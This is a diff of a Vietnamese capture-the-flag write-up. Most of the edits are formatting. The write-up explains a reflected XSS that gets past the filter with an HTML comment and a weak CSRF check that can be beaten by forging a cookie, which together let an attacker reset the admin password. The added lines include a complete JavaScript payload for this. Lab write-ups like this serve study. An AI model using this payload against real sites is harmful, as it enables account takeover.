@@ -1496,7 +1496,7 @@ Nghĩa là:
 
 Đây là điểm quan trọng nhất. Nếu ta gửi một URL có XSS, đoạn JavaScript đó sẽ chạy trong browser của admin.
 
-ở /immortal-gate/check có XSS
+ở `/immortal-gate/check` có XSS
 
 Route bị lỗi:
 ```
@@ -1514,11 +1514,11 @@ Ví dụ:
 
 Response:
 
-Minh, hello
+`Minh, hello`
 
 Nếu đưa HTML vào:
 
-<script>alert(1)</script>
+`<script>alert(1)</script>`
 
 thì response sẽ chứa script. Nếu browser parse response như HTML thì script sẽ chạy.
 
@@ -1538,7 +1538,7 @@ Filter này chỉ kiểm tra tag đầu tiên.
 
 Nếu payload là:
 
-<script>alert(1)</script>
+`<script>alert(1)</script>`
 
 Regex bắt tag đầu tiên là:
 
@@ -1558,7 +1558,7 @@ Phần bên trong là:
 
 Không có chữ cái a-zA-Z, nên santi() cho qua.
 
-Browser hiểu <!-- --> là comment HTML, sau đó gặp <script> và chạy JavaScript.
+Browser hiểu `<!-- -->` là comment HTML, sau đó gặp <script> và chạy JavaScript.
 
 Route đổi password:
 ```
@@ -1584,11 +1584,9 @@ Có 3 lỗi quan trọng.
 
 Thứ nhất, route dùng:
 
-router.all('/cultivation/password', ...)
+`router.all('/cultivation/password', ...)`
 
-router.all nhận mọi HTTP method, bao gồm cả GET.
-
-Middleware CSRF trong middleware.js bỏ qua GET:
+router.all nhận mọi HTTP method, bao gồm cả GET. Middleware CSRF trong middleware.js bỏ qua GET:
 ```
 function csrfProtection(req, res, next) {
   const secFetchSite = req.get('Sec-Fetch-Site');
@@ -1612,15 +1610,13 @@ Nên nếu gửi POST, request có thể bị middleware chặn.
 
 Thứ hai, password mới lấy từ:
 
-const newPassword = req.body.new_password || '';
+`const newPassword = req.body.new_password || '';`
 
 Nếu request là GET, request thường không có body. Khi đó:
 
-req.body.new_password
+`req.body.new_password` là undefined, nên:
 
-là undefined, nên:
-
-undefined || ''
+`undefined || ''`
 
 thành:
 ```
@@ -1628,28 +1624,38 @@ thành:
 ```
 Vì vậy nếu admin gửi:
 
-GET /cultivation/password
+`GET /cultivation/password`
 
 và vượt qua check CSRF, password admin sẽ bị đổi thành chuỗi rỗng.
 
 Thứ ba, CSRF check yếu:
-
+```js
 const csrfToken = req.cookies.csrf_token;
 
 if (req.headers['x-csrf-token'] !== csrfToken) {
   return res.send(alertBack('❌ Tâm ma tác sai, công kích bị ngăn chặn!'));
 }
-
+```
 Server so sánh header với cookie:
 
-x-csrf-token == csrf_token cookie
+`x-csrf-token == csrf_token cookie`
 
 Nhưng ta có thể tạo cookie bằng cách như sau
 
-document.cookie = "csrf_token=x; path=/cultivation/password";
+`document.cookie = "csrf_token=x; path=/cultivation/password";`
 
 Sau đó gửi request kèm header:
 
-x-csrf-token: x
+`x-csrf-token: x`
 
 Khi request đi tới /cultivation/password, cookie csrf_token=x khớp với header x.
+
+<img width="2559" height="1599" alt="image" src="https://github.com/user-attachments/assets/08d665a0-ad59-41bd-a361-5795aa327dec" />
+
+<img width="2559" height="1595" alt="image" src="https://github.com/user-attachments/assets/beb67114-85a4-4752-a098-de975caa88f5" />
+
+
+sử dùng payload `<!-- --><script>document.cookie="csrf_token=x; path=/cultivation/password";var r = new XMLHttpRequest();r.open("GET", "/cultivation/password", false);r.setRequestHeader("x-csrf-token", "x");r.send(null);</script>` để XSS và dễ dàng reset pass admin
+<img width="2558" height="1597" alt="image" src="https://github.com/user-attachments/assets/cfbc2850-1107-41ee-acb6-cccf0895cc25" />
+
+<img width="2559" height="1599" alt="image" src="https://github.com/user-attachments/assets/6210b583-d269-465c-9764-43522086c700" />
